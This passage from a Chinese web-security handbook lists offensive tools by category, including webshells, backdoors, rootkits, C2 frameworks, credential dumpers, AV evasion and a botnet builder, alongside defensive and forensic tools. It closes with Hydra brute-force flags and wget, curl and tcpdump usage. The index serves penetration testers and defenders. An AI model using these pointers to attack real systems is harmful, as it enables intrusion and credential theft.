- [dedecmscan](https://github.com/lengjibo/dedecmscan) 织梦全版本漏洞扫描

#### 10.6.13. Java框架
- [ShiroScan](https://github.com/sv3nbeast/ShiroScan) Shiro<=1.2.4反序列化检测工具
- [fastjson rce tool](https://github.com/wyzxxz/fastjson%5Frce%5Ftool) fastjson命令执行利用工具

#### 10.6.14. DNS相关漏洞
- [dnsAutoRebinding](https://github.com/Tr3jer/dnsAutoRebinding)
- [AngelSword](https://github.com/Lucifer1993/AngelSword)
- [Subdomain TakeOver](https://github.com/m4ll0k/takeover)
- [dnsReaper](https://github.com/punk-security/dnsReaper) subdomain takeover tool
- [mpDNS](https://github.com/nopernik/mpDNS)
- [JudasDNS](https://github.com/mandatoryprogrammer/JudasDNS) Nameserver DNS poisoning
- [singularity](https://github.com/nccgroup/singularity) A DNS rebinding attack framework

#### 10.6.15. DNS数据提取
- [dnsteal](https://github.com/m57/dnsteal)
- [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator)
- [requestbin for dns](http://requestbin.net/dns)

#### 10.6.16. DNS 隧道
- [dnstunnel de](https://dnstunnel.de/)
- [iodine](https://code.kryo.se/iodine/)

#### 10.6.17. DNS Shell
- [chashell](https://github.com/sysdream/chashell)
- [dnscat2](https://github.com/iagox86/dnscat2)

#### 10.6.18. XXE
- [XXEinjector](https://github.com/enjoiz/XXEinjector)
- [XXER](https://github.com/TheTwitchy/xxer)
- [DTD Finder](https://github.com/GoSecure/dtd-finder) List DTDs and generate XXE payloads

#### 10.6.19. 反序列化

##### Java反序列化
- [ysoserial](https://github.com/frohoff/ysoserial)
- [JRE8u20 RCE Gadget](https://github.com/pwntester/JRE8u20%5FRCE%5FGadget)
- [Java Serialization Dumper](https://github.com/NickstaDB/SerializationDumper)
- [marshalsec](https://github.com/mbechler/marshalsec) Java Unmarshaller Security
- [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector) A byte code analyzer for finding deserialization gadget chains
- [fastjsonScan](https://github.com/zilong3033/fastjsonScan) fastjson漏洞burp插件

##### .NET反序列化
- [viewgen](https://github.com/0xacb/viewgen) ASP.NET ViewState Generator

#### 10.6.20. JNDI
- [Rogue JNDI](https://github.com/veracode-research/rogue-jndi) A malicious LDAP server for JNDI injection attacks
- [JNDI Injection Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
- [JNDIExploit](https://github.com/feihong-cs/JNDIExploit)

#### 10.6.21. 端口Hack
- [nmap vulners](https://github.com/vulnersCom/nmap-vulners)
- [nmap nse scripts](https://github.com/cldrn/nmap-nse-scripts)
- [Vulnerability Scanning with Nmap](https://github.com/scipag/vulscan)

#### 10.6.22. JWT
- [jwtcrack](https://github.com/brendan-rius/c-jwt-cracker)

#### 10.6.23. 无线
- [infernal twin](https://github.com/entropy1337/infernal-twin)

#### 10.6.24. 中间人攻击
- [mitmproxy](https://github.com/mitmproxy/mitmproxy)
- [MITMf](https://github.com/byt3bl33d3r/MITMf)
- [ssh mitm](https://github.com/jtesta/ssh-mitm)
- [injectify](https://github.com/samdenty99/injectify)
- [Responder](https://github.com/lgandx/Responder) LLMNR, NBT-NS and MDNS poisoner
- [toxy](https://github.com/h2non/toxy) Hackable HTTP proxy
- [bettercap](https://github.com/bettercap/bettercap) The Swiss Army knife for 802.11, BLE and Ethernet networks

#### 10.6.25. DHCP
- [DHCPwn](https://github.com/mschwager/dhcpwn)

#### 10.6.26. DDoS
- [Saddam](https://github.com/OffensivePython/Saddam)

#### 10.6.27. 正则表达式
- [Regexploit](https://github.com/doyensec/regexploit) Find regular expressions which are vulnerable to ReDoS

#### 10.6.28. Shellcode
- [go shellcode](https://github.com/Ne0nd0g/go-shellcode) A repository of Windows Shellcode runners

#### 10.6.29. 越权
- [secscan authcheck](https://github.com/ztosec/secscan-authcheck)

#### 10.6.30. 利用平台
- [DNSLog](https://github.com/BugScanTeam/DNSLog) 监控 DNS 解析记录和 HTTP 访问记录的工具
- [LuWu](https://github.com/QAX-A-Team/LuWu) 红队基础设施自动化部署工具

#### 10.6.31. 漏洞利用库
- [Penetration Testing POC](https://github.com/Mr-xn/Penetration%5FTesting%5FPOC)
- [thc ipv6](https://github.com/vanhauser-thc/thc-ipv6) IPv6 attack toolkit

#### 10.6.32. 漏洞利用框架
- [pocsuite3](https://github.com/knownsec/pocsuite3)

#### 10.6.33. Windows
- [PyWSUS](https://github.com/GoSecure/pywsus) a standalone implementation of a legitimate WSUS server

---

## [近源渗透](https://websec.readthedocs.io/zh/latest/tools/nearsource.html)

### 10.7. 近源渗透

#### 10.7.1. Bad USB
- [WiFiDuck](https://github.com/spacehuhn/WiFiDuck) - Keystroke injection attack platform
- [BadUSB code](https://github.com/Xyntax/BadUSB-code) - badusb的一些利用方式及代码
- [WHID](https://github.com/whid-injector/WHID) - WiFi HID Injector
- [BadUSB cable](https://github.com/joelsernamoreno/BadUSB-Cable) - based on Attiny85 microcontroller
- [USB Rubber Ducky](https://github.com/hak5darren/USB-Rubber-Ducky)

#### 10.7.2. WiFi
- [wifiphisher](https://github.com/wifiphisher/wifiphisher)
- [evilginx](https://github.com/kgretzky/evilginx)
- [mana](https://github.com/sensepost/mana)
- [pwnagotchi](https://github.com/evilsocket/pwnagotchi)

#### 10.7.3. 无线
- [hackrf](https://github.com/mossmann/hackrf) - low cost software radio platform

---

## [Web持久化](https://websec.readthedocs.io/zh/latest/tools/webpersistence.html)

### 10.8. Web持久化

#### 10.8.1. WebShell管理工具
- [菜刀](https://github.com/Chora10/Cknife)
- [antSword](https://github.com/antoor/antSword)
- [冰蝎](https://github.com/rebeyond/Behinder) 动态二进制加密网站管理客户端
- [weevely3](https://github.com/epinna/weevely3) Weaponized web shell
- [Altman](https://github.com/keepwn/Altman) the cross platform webshell tool in .NET
- [Webshell Sniper](https://github.com/WangYihang/Webshell-Sniper) Manage your website via terminal
- [quasibot](https://github.com/Smaash/quasibot) complex webshell manager

#### 10.8.2. WebShell
- [webshell](https://github.com/tennc/webshell)
- [PHP backdoors](https://github.com/bartblaze/PHP-backdoors)
- [php bash](https://github.com/Arrexel/phpbash) semi-interactive web shell
- [Python RSA Encrypted Shell](https://github.com/Eitenne/TopHat.git)
- [b374k](https://github.com/b374k/b374k) PHP WebShell Custom Tool
- [JSP Webshells](https://github.com/threedr3am/JSP-Webshells)
- [MemShellDemo](https://github.com/jweny/MemShellDemo)

#### 10.8.3. Web后门
- [pwnginx](https://github.com/t57root/pwnginx)
- [Apache backdoor](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor)
- [SharpGen](https://github.com/cobbr/SharpGen) .NET Core console application
- [IIS-Raid](https://github.com/0x09AL/IIS-Raid) A native backdoor module for Microsoft IIS

---

## [横向移动](https://websec.readthedocs.io/zh/latest/tools/intranet.html)

### 10.9. 横向移动

#### 10.9.1. 域
- [impacket](https://github.com/SecureAuthCorp/impacket) - Python classes for working with network protocols
- [adidnsdump](https://github.com/dirkjanm/adidnsdump) - Active Directory Integrated DNS dump tool
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Six Degrees of Domain Admin
- [PlumHound](https://github.com/PlumHound/PlumHound) - Bloodhound for Blue and Purple Teams
- [windapsearch](https://github.com/ropnop/windapsearch) - Enumerate users, groups and computers from Windows domain
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) - Active Directory information dumper via LDAP
- [Kerberoast](https://github.com/nidem/kerberoast) - Tools for attacking MS Kerberos implementations
- [ADRecon](https://github.com/sense-of-security/ADRecon) - Active Directory Recon
- [Creds](https://github.com/S3cur3Th1sSh1t/Creds) - Scripts and Executables for Pentest & Forensics
- [Lithnet Password Protection for Active Directory](https://github.com/lithnet/ad-password-protection)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) - Retrieve crackable hashes from KRB5 AS-REP responses

#### 10.9.2. LDAP
- [SharpHound3](https://github.com/BloodHoundAD/SharpHound3) - Data Collector for the BloodHound Project

#### 10.9.3. 微软系产品利用
- [LyncSniper](https://github.com/mdsecresearch/LyncSniper) - Penetration testing tool for Skype for Business and Lync
- [MSOLSpray](https://github.com/dafthack/MSOLSpray) - Password spraying tool for Microsoft Online accounts
- [MailSniper](https://github.com/dafthack/MailSniper) - Search through email in Microsoft Exchange environment

#### 10.9.4. Azure AD
- [ROADtools](https://github.com/dirkjanm/ROADtools) - Azure AD exploration framework
- [Stormspotter](https://github.com/Azure/Stormspotter) - Azure Red Team tool for graphing Azure and Azure Active Directory objects

#### 10.9.5. Exchange
- [ruler](https://github.com/sensepost/ruler) - Tool to abuse Exchange services
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) - Exchange privileges for Domain Admin privs

#### 10.9.6. PowerShell
- [PowerShellMafia](https://github.com/PowerShellMafia)

#### 10.9.7. 内网信息收集
- [nbtscan](https://github.com/scallywag/nbtscan) - NetBIOS scanning tool
- [SharpShares](https://github.com/djhohnstein/SharpShares) - List network share information from domain machines
- [WinShareEnum](https://github.com/nccgroup/WinShareEnum) - Windows Share Enumerator
- [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) - 全平台的浏览器数据导出工具

#### 10.9.8. Kerberos
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [kerbrute](https://github.com/ropnop/kerbrute) - Kerberos pre-auth bruteforcing tool
- [kerberoast](https://github.com/nidem/kerberoast) - Tools for attacking MS Kerberos implementations

#### 10.9.9. 自动化审计
- [Infection Monkey](https://github.com/guardicore/monkey) - Data center Security Testing Tool

#### 10.9.10. 绕过
- [SysWhispers](https://github.com/jthuraisamy/SysWhispers) - AV/EDR evasion via direct system calls
- [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) - AV/EDR evasion via direct system calls
- [Dumpert](https://github.com/outflanknl/Dumpert) - LSASS memory dumper using direct system calls and API unhooking

#### 10.9.11. 内网扫描
- [InScan](https://github.com/inbug-team/InScan) - 边界打点后的自动化渗透工具
- [fscan](https://github.com/shadow1ng/fscan) - 一款内网综合扫描工具

---

## [云安全](https://websec.readthedocs.io/zh/latest/tools/cloud.html)

### 10.10. 云安全

#### 10.10.1. k8s
- [checkov](https://github.com/bridgecrewio/checkov) Prevent cloud misconfigurations
- [CDK](https://github.com/cdk-team/CDK) Zero Dependency Container Penetration Toolkit
- [kube-bench](https://github.com/aquasecurity/kube-bench) Kubernetes 安全基准测试工具
- [kube-hunter](https://github.com/aquasecurity/kube-hunter) Hunt for security weaknesses in Kubernetes clusters
- [KubiScan](https://github.com/cyberark/KubiScan) A tool to scan Kubernetes cluster for risky permissions
- [kubescape](https://github.com/armosec/kubescape) Kubernetes Hardening Guidance by NSA and CISA
- [kubeaudit](https://github.com/Shopify/kubeaudit) Kubernetes clusters security audit
- [peirates](https://github.com/inguardians/peirates) Kubernetes Penetration Testing tool
- [datree](https://github.com/datreeio/datree) Prevent Kubernetes misconfigurations

#### 10.10.2. 容器
- [botb](https://github.com/brompwnie/botb) A container analysis and exploitation tool

#### 10.10.3. 安全加固
- [falco](https://github.com/falcosecurity/falco) Cloud Native Runtime Security

#### 10.10.4. 云上扫描
- [Cloud Custodian](https://github.com/cloud-custodian/cloud-custodian) Rules engine for cloud security
- [cloudquery](https://github.com/cloudquery/cloudquery) transforms cloud infrastructure into SQL database

#### 10.10.5. 靶场环境
- [metarget](https://github.com/Metarget/metarget) a framework providing automatic constructions of vulnerable infrastructures
- [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) Vulnerable by Design AWS deployment tool

---

## [操作系统持久化](https://websec.readthedocs.io/zh/latest/tools/ospersistence.html)

### 10.11. 操作系统持久化

#### 10.11.1. Windows

##### 凭证获取
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [RdpThief](https://github.com/0x09AL/RdpThief) Extracting Clear Text Passwords from mstsc.exe
- [quarkspwdump](https://github.com/quarkslab/quarkspwdump) Dump various types of Windows credentials
- [SharpDump](https://github.com/GhostPack/SharpDump)

##### 权限提升
- [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [GTFOBins](https://github.com/GTFOBins/GTFOBins.github.io) Curated list of Unix binaries that can be exploited to bypass system security restrictions
- [JAWS](https://github.com/411Hall/JAWS) Just Another Windows (Enum) Script

##### UAC Bypass
- [WinPwnage](https://github.com/rootm0s/WinPwnage) UAC bypass, Elevate, Persistence and Execution methods
- [UACME](https://github.com/hfiref0x/UACME) Defeating Windows User Account Control
- [UAC Bypass In The Wild](https://github.com/sailay1996/UAC%5FBypass%5FIn%5FThe%5FWild)

##### 免杀
- [SigThief](https://github.com/secretsquirrel/SigThief) Stealing Signatures

##### C2
- [SharpSploit](https://github.com/cobbr/SharpSploit) .NET post-exploitation library
- [SharpBeacon](https://github.com/mai1zhi2/SharpBeacon) .NET重写了CobaltStrike stager及Beacon
- [Koadic](https://github.com/zerosum0x0/koadic) Windows post-exploitation rootkit
- [PoshC2](https://github.com/nettitude/PoshC2) A proxy aware C2 framework

##### 隐藏
- [ProcessHider](https://github.com/M00nRise/ProcessHider) Post-exploitation tool for hiding processes
- [Invoke Phant0m](https://github.com/hlldz/Invoke-Phant0m) Windows Event Log Killer
- [EventCleaner](https://github.com/QAX-A-Team/EventCleaner)

##### DLL注入
- [sRDI](https://github.com/monoxgas/sRDI) Shellcode Reflective DLL Injection

##### rootkit
- [r77-rootkit](https://github.com/bytecode77/r77-rootkit) Ring 3 rootkit

##### 伪造
- [parent PID spoofing](https://github.com/countercept/ppid-spoofing)
- [GetSystem](https://github.com/py7hagoras/GetSystem) C# implementation via PPID spoofing

##### MiTM
- [Seth](https://github.com/SySS-Research/Seth) MitM attack and extract credentials from RDP
- [pyrdp](https://github.com/GoSecure/pyrdp) RDP man-in-the-middle

##### 综合工具
- [Nishang](https://github.com/samratashok/nishang) Offensive PowerShell for red team
- [SharPersist](https://github.com/fireeye/SharPersist) Windows persistence toolkit

#### 10.11.2. Linux

##### 权限提升
- [linux exploit suggester](https://github.com/mzet-/linux-exploit-suggester)
- [LinEnum](https://github.com/rebootuser/LinEnum) Scripted Local Linux Enumeration & Privilege Escalation Checks
- [AutoLocalPrivilegeEscalation](https://github.com/ngalongc/AutoLocalPrivilegeEscalation)
- [traitor](https://github.com/liamg/traitor) Automatic Linux privesc

##### rootkit
- [rootkit](https://github.com/nurupo/rootkit)
- [Diamorphine](https://github.com/m0nad/Diamorphine) LKM rootkit for Linux Kernels

##### 后门
- [prism](https://github.com/andreafabrizi/prism) user space stealth reverse shell backdoor
- [icmpsh](https://github.com/inquisb/icmpsh) Simple reverse ICMP shell

#### 10.11.3. 综合

##### 凭证获取
- [sshLooterC](https://github.com/mthbernardes/sshLooterC) SSH密码窃取
- [keychaindump](https://github.com/juuso/keychaindump) OS X keychain passwords
- [LaZagne](https://github.com/AlessandroZ/LaZagne) Credentials recovery project
- [SecretScanner](https://github.com/deepfence/SecretScanner) Find secrets and passwords

##### 权限提升
- [BeRoot](https://github.com/AlessandroZ/BeRoot) Privilege Escalation Project Windows/Linux/Mac

##### RAT
- [QuasarRAT](https://github.com/quasar/QuasarRAT)

##### C2
- [Empire](https://github.com/EmpireProject/Empire)
- [pupy](https://github.com/n1nj4sec/pupy)
- [Covenant](https://github.com/cobbr/Covenant) collaborative .NET C2 framework
- [Cooolis-ms](https://github.com/Rvn0xsy/Cooolis-ms)

##### DNS Shell
- [DNS Shell](https://github.com/sensepost/DNS-Shell) interactive Shell over DNS
- [Reverse DNS Shell](https://github.com/ahhh/Reverse%5FDNS%5FShell)

##### Cobalt Strike
- [Cobalt Strike](https://www.cobaltstrike.com)
- [CrossC2](https://github.com/gloxec/CrossC2) generate CobaltStrike's cross-platform payload
- [Cobalt Strike Aggressor Scripts](https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts)

##### 日志清除
- [Log killer](https://github.com/Rizer0/Log-killer) Clear all logs in linux/windows servers

##### Botnet
- [byob](https://github.com/malwaredllc/byob) Build Your Own Botnet

##### 免杀工具
- [AV Evasion Tool](https://github.com/1y0n/AV%5FEvasion%5FTool) 掩日 - 免杀执行器生成工具
- [DKMC](https://github.com/Mr-Un1k0d3r/DKMC) Dont kill my cat

---

## [审计工具](https://websec.readthedocs.io/zh/latest/tools/audit.html)

### 10.12. 审计工具

#### 10.12.1. 通用
- [Cobra](https://github.com/FeeiCN/cobra)
- [Semmle QL](https://github.com/Semmle/ql)
- [Sourcetrail](https://github.com/CoatiSoftware/Sourcetrail) free and open-source cross-platform source explorer
- [trivy](https://github.com/knqyf263/trivy) A Simple and Comprehensive Vulnerability Scanner for Containers
- [fortify](http://www.fortify.net/)
- [joern](https://github.com/joernio/joern) Open-source code analysis platform

#### 10.12.2. PHP
- [RIPS](http://rips-scanner.sourceforge.net/)
- [prvd](https://github.com/fate0/prvd)
- [phpvulhunter](https://github.com/OneSourceCat/phpvulhunter)
- [chip](https://github.com/phith0n/chip) a simple tool to detect potential security threat in php code

#### 10.12.3. Python
- [pyvulhunter](https://github.com/shengqi158/pyvulhunter)
- [pyt](https://github.com/python-security/pyt)

#### 10.12.4. Java
- [find sec bugs](https://github.com/find-sec-bugs/find-sec-bugs)
- [Gadget Inspector](https://github.com/JackOfMostTrades/gadgetinspector) A byte code analyzer for finding deserialization gadget chains

#### 10.12.5. JavaScript
- [NodeJsScan](https://github.com/ajinabraham/NodeJsScan)

#### 10.12.6. 供应链
- [Dependency-Track](https://github.com/DependencyTrack/dependency-track) Supply Chain Component Analysis platform

#### 10.12.7. 小程序
- [unveilr](https://github.com/r3x5ur/unveilr)

---

## [防御](https://websec.readthedocs.io/zh/latest/tools/defense.html)

### 10.13. 防御

#### 10.13.1. 日志检查
- [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [LastActivityView](http://www.nirsoft.net/utils/computer%5Factivity%5Fview.html)
- [Regshot](https://sourceforge.net/projects/regshot/)
- [teler](https://github.com/kitabisa/teler) Real-time HTTP Intrusion Detection

#### 10.13.2. 终端监控
- [attack monitor](https://github.com/yarox24/attack%5Fmonitor) Endpoint detection & Malware analysis software
- [artillery](https://github.com/BinaryDefense/artillery) protect Linux and Windows
- [yurita](https://github.com/paypal/yurita) Anomaly detection framework @ PayPal
- [crowdsec](https://github.com/crowdsecurity/crowdsec) detect and respond to bad behaviours
- [tracee](https://github.com/aquasecurity/tracee) Linux Runtime Security and Forensics using eBPF

#### 10.13.3. XSS防护
- [js xss](https://github.com/leizongmin/js-xss)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [google csp evaluator](https://csp-evaluator.withgoogle.com/)

#### 10.13.4. 配置检查
- [Attack Surface Analyzer](https://github.com/microsoft/AttackSurfaceAnalyzer)
- [gixy](https://github.com/yandex/gixy) Nginx 配置检查工具
- [dockerscan](https://github.com/cr0hn/dockerscan) Docker security analysis

#### 10.13.5. 安全检查
- [lynis](https://github.com/CISOfy/lynis) Security auditing tool for Linux, macOS, and UNIX
- [linux malware detect](https://github.com/rfxn/linux-malware-detect)

#### 10.13.6. IDS
- [ossec](https://github.com/ossec/ossec-hids)
- [yulong](https://github.com/ysrc/yulong-hids)
- [AgentSmith](https://github.com/DianrongSecurity/AgentSmith-HIDS)
- [ByteDance HIDS](https://github.com/bytedance/ByteDance-HIDS) Cloud-Native Host-Based Intrusion Detection

#### 10.13.7. RASP
- [Elkeid](https://github.com/bytedance/Elkeid) Cloud-Native Host-Based Intrusion Detection
- [openrasp](https://github.com/baidu-security/openrasp-iast) IAST 灰盒扫描工具

#### 10.13.8. SIEM
- [panther](https://github.com/panther-labs/panther) Detect threats with log data

#### 10.13.9. 威胁情报
- [threatfeeds](https://threatfeeds.io/)
- [abuseipdb](https://www.abuseipdb.com/)

#### 10.13.10. APT
- [APT Groups and Operations](https://docs.google.com/spreadsheets/d/1H9%5FxaxQHpWaa4O%5FSon4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml)
- [APTnotes](https://github.com/kbandla/APTnotes)
- [APT Hunter](https://github.com/ahmedkhlief/APT-Hunter) Threat Hunting tool for windows event logs

#### 10.13.11. 入侵检查
- [huorong](https://www.huorong.cn/)
- [check rootkit](http://www.chkrootkit.org)
- [rootkit hunter](http://rkhunter.sourceforge.net/)
- [PC Hunter](http://www.xuetr.com/)
- [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)

#### 10.13.12. 进程查看
- [Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer)
- [ProcessHacker](https://processhacker.sourceforge.io/)

#### 10.13.13. Waf
- [naxsi](https://github.com/nbs-system/naxsi)
- [ModSecurity](https://github.com/SpiderLabs/ModSecurity)
- [ngx_lua_waf](https://github.com/loveshell/ngx%5Flua%5Fwaf)
- [OpenWAF](https://github.com/titansec/OpenWAF)

#### 10.13.14. 病毒在线查杀
- [virustotal](https://www.virustotal.com/)
- [virscan](http://www.virscan.org)
- [habo](https://habo.qq.com)

#### 10.13.15. WebShell查杀
- [D盾](http://www.d99net.net/index.asp)
- [深信服WebShell查杀](http://edr.sangfor.com.cn/backdoor%5Fdetection.html)
- [php malware finder](https://github.com/nbs-system/php-malware-finder)

#### 10.13.16. 规则 / IoC
- [malware ioc](https://github.com/eset/malware-ioc)
- [fireeye public iocs](https://github.com/fireeye/iocs)
- [signature base](https://github.com/Neo23x0/signature-base)
- [yara rules](https://github.com/Yara-Rules/rules)
- [capa rules](https://github.com/fireeye/capa-rules)
- [AttackDetection](https://github.com/ptresearch/AttackDetection) Suricata PT Open Ruleset
- [DailyIOC](https://github.com/StrangerealIntel/DailyIOC)

#### 10.13.17. 威胁检测
- [ARTIF](https://github.com/CRED-CLUB/ARTIF) real time threat intelligence framework

#### 10.13.18. Security Advisories
- [Apache httpd Security Advisories](https://httpd.apache.org/security/)
- [Apache Solr](https://lucene.apache.org/solr/security.html)
- [Apache Tomcat](https://tomcat.apache.org/security-8.html)
- [Jetty Security Reports](https://www.eclipse.org/jetty/documentation/current/security-reports.html)
- [Nginx Security Advisories](http://nginx.org/en/security%5Fadvisories.html)
- [OpenSSL](https://www.openssl.org/news/vulnerabilities.html)

#### 10.13.19. Security Tracker
- [Nginx Security Tracker](https://security-tracker.debian.org/tracker/source-package/nginx)

#### 10.13.20. 匹配工具
- [yara](https://github.com/VirusTotal/yara) The pattern matching swiss knife
- [capa](https://github.com/fireeye/capa) identify capabilities in executable files

#### 10.13.21. DoS防护
- [Gatekeeper](https://github.com/AltraMayor/gatekeeper) open-source DDoS protection system

#### 10.13.22. 对手模拟 / 攻击模拟
- [sliver](https://github.com/BishopFox/sliver) Adversary Simulation Framework
- [caldera](https://github.com/mitre/caldera) Automated Adversary Emulation Platform
- [DumpsterFire](https://github.com/TryCatchHCF/DumpsterFire)

#### 10.13.23. 入侵防护
- [fail2ban](https://github.com/fail2ban/fail2ban)

---

## [SDL](https://websec.readthedocs.io/zh/latest/tools/sdl.html)

[抓取失败]

---

## [运维](https://websec.readthedocs.io/zh/latest/tools/operation.html)

[抓取失败]

---

## [取证](https://websec.readthedocs.io/zh/latest/tools/forensics.html)

### 10.16. 取证

#### 10.16.1. 内存取证
- [SfAntiBotPro](http://edr.sangfor.com.cn/tool/SfabAntiBot%5FX64.7z)
- [volatility](https://github.com/volatilityfoundation/volatility)
- [Rekall](https://github.com/google/rekall) Memory Forensic Framework
- [LiME](https://github.com/504ensicsLabs/LiME) Loadable Kernel Module for memory acquisition
- [AVML](https://github.com/microsoft/avml) Acquire Volatile Memory for Linux

---

## [其他](https://websec.readthedocs.io/zh/latest/tools/misc.html)

### 10.17. 其他

#### 10.17.1. 综合框架
- [metasploit](https://www.metasploit.com/)
- [w3af](http://w3af.org/)
- [AutoSploit](https://github.com/NullArray/AutoSploit/)
- [Nikto](https://cirt.net/nikto2)
- [skipfish](https://my.oschina.net/u/995648/blog/114321)
- [Arachni](http://www.arachni-scanner.com/)
- [ZAP](http://www.freebuf.com/sectool/5427.html)
- [BrupSuite](https://portswigger.net/burp/)
- [Spiderfoot](https://github.com/smicallef/spiderfoot)
- [AZScanner](https://github.com/az0ne/AZScanner)
- [Fuxi](https://github.com/jeffzh3ng/Fuxi-Scanner)
- [vooki](https://www.vegabird.com/vooki/)
- [BadMod](https://github.com/MrSqar-Ye/BadMod)
- [fsociety](https://github.com/Manisso/fsociety) Hacking Tools Pack
- [axiom](https://github.com/pry0cc/axiom) A dynamic infrastructure toolkit for red teamers and bug bounty hunters

#### 10.17.2. 验证码
- [CAPTCHA22](https://github.com/FSecureLABS/captcha22) toolset for building and training CAPTCHA cracking models

#### 10.17.3. WebAssembly
- [wabt](https://github.com/WebAssembly/wabt)
- [binaryen](https://github.com/WebAssembly/binaryen)
- [wasmdec](https://github.com/wwwg/wasmdec)

#### 10.17.4. 混淆
- [JStillery](https://github.com/mindedsecurity/JStillery)
- [javascript obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
- [基于hook的php混淆解密](https://github.com/CaledoniaProject/php-decoder)
- [Invoke Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

#### 10.17.5. Proxy Pool
- [proxy pool by jhao104](https://github.com/jhao104/proxy%5Fpool)
- [Proxy Pool by Germey](https://github.com/Python3WebSpider/ProxyPool)
- [scylla](https://github.com/imWildCat/scylla)

#### 10.17.6. Android
- [DroidSSLUnpinning](https://github.com/WooyunDota/DroidSSLUnpinning) Android certificate pinning disable tools

#### 10.17.7. 其他
- [Serverless Toolkit](https://github.com/ropnop/serverless%5Ftoolkit)
- [Rendering Engine Probe](https://github.com/PortSwigger/hackability)
- [httrack](http://www.httrack.com/)
- [curl](https://curl.haxx.se/)
- [htrace](https://github.com/trimstray/htrace.sh)
- [Microsoft Sysinternals Utilities](https://docs.microsoft.com/en-us/sysinternals/downloads/)

---

## [爆破工具](https://websec.readthedocs.io/zh/latest/manual/brute.html)

### 11.1. 爆破工具

#### 11.1.1. Hydra
- `-R` 继续从上一次进度破解
- `-S` 使用SSL链接
- `-s<PORT>` 指定端口
- `-l<LOGIN>` 指定破解的用户
- `-L<FILE>` 指定用户名字典
- `-p<PASS>` 指定密码破解
- `-P<FILE>` 指定密码字典
- `-e<ns>` 可选选项，n：空密码试探，s：使用指定用户和密码试探
- `-C<FILE>` 使用冒号分割格式，例如"user:pwd"来代替-L/-P参数
- `-M<FILE>` 指定目标列表文件一行一条
- `-o<FILE>` 指定结果输出文件
- `-f` 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
- `-t<TASKS>` 同时运行的线程数，默认为16
- `-w<TIME>` 设置最大超时的时间，单位秒，默认是30s
- `-vV` 显示详细过程

---

## [下载工具](https://websec.readthedocs.io/zh/latest/manual/download.html)

### 11.2. 下载工具

#### 11.2.1. wget

##### 常用
- 普通下载 `wget http://example.com/file.iso`
- 指定保存文件名 `wget ‐‐output-document=myname.iso http://example.com/file.iso`
- 保存到指定目录 `wget ‐‐directory-prefix=folder/subfolder http://example.com/file.iso`
- 大文件断点续传 `wget ‐‐continue http://example.com/big.file.iso`
- 下载指定文件中的url列表 `wget ‐‐input list-of-file-urls.txt`
- 下载指定数字列表的多个文件 `wget http://example.com/images/{1..20}.jpg`
- 下载web页面的所有资源 `wget ‐‐page-requisites ‐‐span-hosts ‐‐convert-links ‐‐adjust-extension http://example.com/dir/file`

##### 整站下载
- 下载所有链接的页面和文件 `wget ‐‐execute robots=off ‐‐recursive ‐‐no-parent ‐‐continue ‐‐no-clobber http://example.com/`
- 下载指定后缀的文件 `wget ‐‐level=1 ‐‐recursive ‐‐no-parent ‐‐accept mp3,MP3 http://example.com/mp3/`
- 排除指定目录下载 `wget ‐‐recursive ‐‐no-clobber ‐‐no-parent ‐‐exclude-directories /forums,/support http://example.com`

##### 指定参数
- user agent `‐‐user-agent="Mozilla/5.0 Firefox/4.0.1"`
- basic auth `‐‐http-user=user ‐‐http-password=pwd`
- 保存cookie `‐‐cookies=on ‐‐save-cookies cookies.txt ‐‐keep-session-cookies`
- 使用cookie `‐‐cookies=on ‐‐load-cookies cookies.txt ‐‐keep-session-cookies`

#### 11.2.2. curl

##### 常用
- 直接显示 `curl www.example.com`
- 保存指定的名字 `-o newname`
- 不指定名字 `-O`

##### 正则
- 文件名 `curl ftp://example.com/file[1-100].txt`
- 域名 `curl http://site.{one,two,three}.com`

---

## [流量相关](https://websec.readthedocs.io/zh/latest/manual/traffic.html)

### 11.3. 流量相关

#### 11.3.1. TCPDump

TCPDump是一款数据包的抓取分析工具，可以将网络中传送的数据包的完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供逻辑语句来过滤包。

##### 命令行常用选项
- `-B <buffer_size>` 抓取流量的缓冲区大小，单位为KB
- `-c <count>` 抓取n个包后退出
- `-C <file_size>` 当前记录的包超过一定大小后，另起一个文件记录，单位为MB
- `-i <interface>` 指定抓取网卡经过的流量
- `-n` 不转换地址
- `-r <file>` 读取保存的pcap文件
- `-s <snaplen>` 从每个报文中截取snaplen字节的数据，0为所有数据
- `-q` 输出简略的协议相关信息
- `-W <cnt>` 写满cnt个文件后就不再写入
- `-w <file>` 保存流量至文件
- `-G <seconds>` 按时间分包
- `-v` 产生详细的输出，`-vv` `-vvv` 会产生更详细的输出
- `-X` 输出报文头和包的内容
- `-Z <user>` 在写文件之前，转换用户

#### 11.3.2. Bro

Bro是一个开源的网络流量分析工具，支持多种协议，可实时或者离线分析流量。

##### 命令行
- 实时监控 `bro -i <interface> <list of script to load>`
- 分析本地流量 `bro -r <pcapfile> <scripts...>`
- 分割解析流量后的日志 `bro-cut`

#### 11.3.3. tcpflow

tcpflow也是一个抓包工具，它的特点是以流为单位显示数据内容。

##### 命令行常用选项
- `-b max_bytes` 定义最大抓取流量
- `-e name` 指定解析的scanner
- `-i interface` 指定抓取接口
- `-o outputdir` 指定输出文件夹
- `-r file` 读取文件
